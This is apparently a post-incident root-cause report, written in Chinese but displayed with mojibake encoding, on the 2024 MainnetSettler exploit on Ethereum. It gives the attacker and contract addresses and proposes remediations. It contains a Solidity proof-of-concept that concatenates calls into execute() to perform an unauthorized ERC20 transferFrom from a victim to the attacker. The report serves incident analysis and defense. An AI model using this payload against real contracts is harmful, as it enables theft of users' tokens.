# MainnetSettler Hack æ ¹å› åˆ†ææŠ¥å‘Š

## ğŸ“Š æ‰§è¡Œæ‘˜è¦
- **é¡¹ç›®**: MainnetSettler
- **æ—¥æœŸ**: 2024
- **ç½‘ç»œ**: Ethereum Mainnet
- **æŸå¤±**: ~ $66K
- **ç±»å‹**: ä»»æ„åŠ¨ä½œæ‰§è¡Œ/è®¿é—®æ§åˆ¶ç¼ºé™·ï¼ˆæ‰¹å¤„ç†æ•°æ®é©±åŠ¨è°ƒç”¨ï¼‰
- **çº§åˆ«**: ğŸ”´ ä¸¥é‡

## ğŸ¯ æ”»å‡»æ¦‚è§ˆ
- **æ”»å‡»è€…**: `0x3A38877312D1125d2391663CBa9f7190953Bf2d9`
- **ç›¸å…³åˆçº¦ (MainnetSettler)**: `0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710`
- **å—å®³ä»£å¸ (hold)**: `0x68B36248477277865c64DFc78884Ef80577078F3`
- **æ”»å‡»äº¤æ˜“**: `0xfab5912f858b3768b7b7d312abcc02b64af7b1e1b62c4f29a2c1a2d1568e9fa2`

## ğŸ’» æŠ€æœ¯åˆ†æ

PoC å±•ç¤ºäº†å¯é€šè¿‡æ„é€ æ‰¹å¤„ç† `actions` ä¸ `fixeddata`ï¼Œè°ƒç”¨ `MainnetSettler.execute(...)` åœ¨ç¼ºå°‘å……åˆ†é‰´æƒä¸ä¸å˜é‡æ£€æŸ¥çš„æƒ…å†µä¸‹ï¼Œæ··åˆæ‹¼æ¥ä¸¤æ®µåº•å±‚è°ƒç”¨å¹¶è¾¾æˆè¶Šæƒè½¬è´¦ï¼š

```solidity
bytes memory call1 = abi.encodeWithSelector(
    bytes4(0x38c9c147),
    uint256(0),
    uint256(10000),
    address(hold),
    uint256(0),
    uint256(160),
    uint256(100)
);

bytes memory call2 = abi.encodeWithSelector(
    bytes4(0x23b872dd), // ERC20 transferFrom
    address(0xA31d98b1aA71a99565EC2564b81f834E90B1097b),
    address(attacker),
    uint256(308453642481581939556432141)
);

bytes[] memory actions = new bytes[](1);
actions[0] = abi.encodePacked(call1, call2);

IMainnetSettler.Slippage memory s = IMainnetSettler.Slippage({
    recipient: address(0),
    buyToken: address(0),
    minAmountOut: 0
});

IMainnetSettler(MainnetSettler).execute(s, actions, fixeddata);
```

å…³é”®ç‚¹ï¼š
- `actions` å…ƒç´ å…è®¸æºå¸¦ä»»æ„ç¼–ç æ•°æ®ï¼Œåº•å±‚æ‰§è¡Œæ—¶æœªå¯¹æ‹¼æ¥çš„å¤šæ®µè°ƒç”¨è¿›è¡Œæ¥æº/ç­¾å/é¡ºåºçº¦æŸï¼›
- `fixeddata` ä½œä¸ºä¸Šä¸‹æ–‡è¢«æ»¥ç”¨ä»¥ç»•è¿‡éªŒè¯ï¼›
- æ‰¹å¤„ç†æ‰§è¡Œæœªå¯¹â€œå•ç¬”æ•°æ®ä¸­å¤šæ®µè°ƒç”¨â€çš„è¾¹ç•Œè¿›è¡Œéš”ç¦»ä¸æˆæƒæ£€æŸ¥ï¼Œå¯¼è‡´å¯åœ¨ä¸€æ¬¡ `execute` ä¸­å®Œæˆâ€œå‡†å¤‡ + è½¬è´¦â€çš„ç»„åˆæ”»å‡»ã€‚

### å½±å“è¯„ä¼°
- ç›´æ¥æŸå¤±çº¦ $66Kï¼›
- ä»»æ„æ”»å‡»è€…å¯æ„é€ æ‰¹å¤„ç†æ•°æ®ï¼Œè¶Šæƒä»å—å½±å“èµ„äº§ä¸­è½¬å‡ºå¤§é‡ä»£å¸ã€‚

## ğŸ¯ æ ¹æœ¬åŸå› 
- `execute(Slippage, bytes[], bytes32)` æ¥å£å…è®¸ä»¥æ•°æ®é©±åŠ¨çš„æ–¹å¼æ‰¹é‡æ‰§è¡Œåº•å±‚è°ƒç”¨ï¼Œä½†ç¼ºä¹ï¼š
  - å¯¹è°ƒç”¨è€…èº«ä»½ä¸æ¥æºç­¾åçš„æ ¡éªŒï¼›
  - å¯¹ `actions` æ•°æ®ç»“æ„çš„ä¸¥æ ¼è§£æä¸éš”ç¦»ï¼ˆé˜²æ­¢ `abi.encodePacked` æ‹¼æ¥å¤šæ®µæ•æ„Ÿè°ƒç”¨ï¼‰ï¼›
  - å¯¹ä»£å¸ `transferFrom` ç­‰æ•æ„Ÿæ“ä½œçš„ä¸šåŠ¡å‰ç½®ä¸å˜é‡ä¸é¢åº¦é™åˆ¶ï¼›
  - å¯¹ä¸Šä¸‹æ–‡ `fixeddata` çš„è¯­ä¹‰æ ¡éªŒï¼Œå¯¼è‡´éªŒè¯è¢«ç»•è¿‡ã€‚

## ğŸ› ï¸ ä¿®å¤å»ºè®®
- çŸ­æœŸï¼š
  - é™åˆ¶ `execute` ä»…æ¥å—ç»“æ„åŒ–ã€å•ä¸€åŠ¨ä½œçš„ä¸¥æ ¼å‚æ•°ï¼Œæ‹’ç»ä»»æ„å­—èŠ‚æ‹¼æ¥ï¼›
  - å¼•å…¥ EIP-712 ç­¾åæ ¡éªŒä¸è§’è‰²æƒé™ï¼ˆOwnable2Step/AccessControlï¼‰ï¼Œå¯¹æ¯ç¬”åŠ¨ä½œè¿›è¡Œæˆæƒï¼›
  - æ‰§è¡Œå‰ååšä½™é¢ä¸å˜é‡æ£€æŸ¥ï¼Œç¦æ­¢å‡ºç°â€œé¢å¤–å¤–æµâ€ã€‚
- é•¿æœŸï¼š
  - é‡‡ç”¨ç™½åå•åŠ¨ä½œè¡¨ + æ˜ç¡®å¯è°ƒç”¨é€‰æ‹©å™¨æ¸…å•ï¼Œç§»é™¤è£¸å­—èŠ‚ç›´é€šï¼›
  - ä¸ºæ‰¹å¤„ç†æ¡†æ¶å¢åŠ åŠ¨ä½œéš”ç¦»ä¸åŸå­æ€§ä¿éšœï¼Œæ¯æ­¥æ ¡éªŒå¤±è´¥å³æ•´ä½“å›æ»šï¼›
  - å®‰å…¨å®¡è®¡è¦†ç›–â€œæ•°æ®æ‹¼æ¥ï¼ˆabi.encodePackedï¼‰â€â€œè·¨æ¨¡å—æ‰¹å¤„ç†â€ç­‰é«˜é£é™©è·¯å¾„ã€‚

## ğŸ”— å‚è€ƒ
- MainnetSettlerï¼š`0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710`
- å—å®³ä»£å¸ï¼š`0x68B36248477277865c64DFc78884Ef80577078F3`
- æ”»å‡»äº¤æ˜“ï¼š`0xfab5912f...e9fa2`
- ä¿¡æ¯æ¥æºï¼š`https://x.com/TenArmorAlert/status/1859416451473604902`

---
**æŠ¥å‘Šç”Ÿæˆ**: 2025-10-12 | **ç‰ˆæœ¬**: 1.1
